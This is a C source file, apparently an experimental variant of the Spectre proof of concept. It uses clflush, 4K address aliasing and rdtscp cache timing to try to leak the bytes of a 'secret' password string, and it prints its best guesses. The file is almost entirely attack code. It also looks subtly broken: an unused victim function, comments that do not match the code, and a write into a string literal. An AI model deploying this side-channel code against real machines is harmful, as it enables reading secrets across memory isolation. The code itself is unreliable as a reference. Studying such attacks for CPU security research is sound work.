/* Compile with "gcc -O0 -std=gnu99" */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt",on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif
#include <inttypes.h>

/********************************************************************
Victim code.
********************************************************************/
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = {
  1,
  2,
  3,
  4,
  5,
  6,
  7,
  8,
  9,
  10,
  11,
  12,
  13,
  14,
  15,
  16
};
uint8_t unused2[64];
uint8_t array2[256 * 512];
uint8_t bigArray[4096*512];
char * secret = "The password is rootkea";
uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */
volatile uint8_t* addr;

void victim_function() {
  
    bigArray[0] = 'c';


}

/********************************************************************
Analysis code
********************************************************************/
#define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */

/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(size_t malicious_x, uint8_t value[3], int score[3]) {
  static int results[256];
  int tries, i, j, k, mix_i, junk = 0;
  uint8_t data = 0;
  size_t training_x, x;
  register uint64_t time1, time2;


  for (i = 0; i < 256; i++) {
      //printf("try %d", i);
      //results[i] = 0;
  }
    
  for (tries = 999; tries > 0; tries--) {
    results[0] = 0;
    /* Flush big array[4096*(0..255)] from cache */
    for (i = 0; i < 4096; i++)
      _mm_clflush( & bigArray[i]); /* intrinsic for clflush instruction */
    
    /* Flush array2[4096*(0..255)] from cache */
    for (i = 0; i < 256; i++)
      _mm_clflush( & array2[i * 512]); /* intrinsic for clflush instruction */

        
    for (j = 29; j >= 0; j--) {
        for (volatile int z = 0; z < 100; z++) {} /* Delay (can also mfence) */
        

        addr = &bigArray[malicious_x];

        secret[0] = 'q';

        data = *addr;
        //Now the data from bigArray[0] is supposed to temporarily be in (data) so we will access this point
        temp &= array2[data * 512];
    }

    //Now we accessed the point in the memory that is correlated with the data in big[0]
    //Now we can see in which place in array2 we have a speed up

    /* Time reads. Order is slightly mixed up to prevent stride prediction */
    for (i = 0; i < 256; i++) {
        mix_i = ((i * 167) + 13) & 255;
        addr = &array2[mix_i * 512];
        time1 = __rdtscp(&junk); /* READ TIMER */
        junk = *addr; /* MEMORY ACCESS TO TIME */
        time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
        if (time2 <= CACHE_HIT_THRESHOLD ) { //TODO: also check it is not the thing in 4096
            results[mix_i]++; /* cache hit - add +1 to score for this value */

        }
    }
  }

  int maxer = 0;
  int indexOf = -1;
  for (i = 0; i < 256; i++) {
      if (results[i] > maxer) {
          maxer = results[i];
          indexOf = i;
      }
  }
  value[0] = (uint8_t)indexOf;
  score[0] = results[indexOf];
  maxer = 0;
  int indexOfSecond = -1;
  for (i = 0; i < 256; i++) {
      if (results[i] > maxer && i != indexOf) {
          maxer = results[i];
          indexOfSecond = i;
      }
  }
  value[1] = (uint8_t)indexOfSecond;
  score[1] = results[indexOfSecond];

  maxer = 0;
  int indexOfThird = -1;
  for (i = 0; i < 256; i++) {
      if (results[i] > maxer && i != indexOf && i != indexOfSecond) {
          maxer = results[i];
          indexOfThird = i;
      }
  }
  value[2] = (uint8_t)indexOfThird;
  score[2] = results[indexOfThird];
  results[0] ^= junk & temp & data; /* use data so code above won't get optimized out */
  
}

int main(int argc, const char * * argv) {
  size_t malicious_x = 1; /* default for malicious_x */
  int i, score[3], len = 23;
  uint8_t value[3];
  for (i = 0; i < sizeof(array2); i++)
    array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
  for (i = 0; i < sizeof(bigArray); i++)
      bigArray[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */

  uint64_t addressOfStartOfSecretModulo = (uint64_t)&secret[0] % 4096;

  //Find the address that corresponds to secret[0] in terms of its modulu
  for (i = 0; i < sizeof(bigArray); i++) {
      addr = &bigArray[i];
      if ((uint64_t)(addr) % 4096 == addressOfStartOfSecretModulo) {
          malicious_x = i; //This is the location that we need in bigArray
          break;
      }
  }
  bigArray[malicious_x] = 'A';
  printf("Malicious x is %zu", malicious_x);
  while (--len >= 0) {
    printf("iteration %d \n", len);
    readMemoryByte(malicious_x, value, score);

    printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
    printf("0x%02X=%c score=%d ", value[0],
          (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
    printf("(second best: 0x%02X=%c score=%d)", value[1], value[1], score[1]);
    printf("(third best: 0x%02X=%c score=%d)", value[2],value[2], score[2]);
    
  }
  return (0);
}
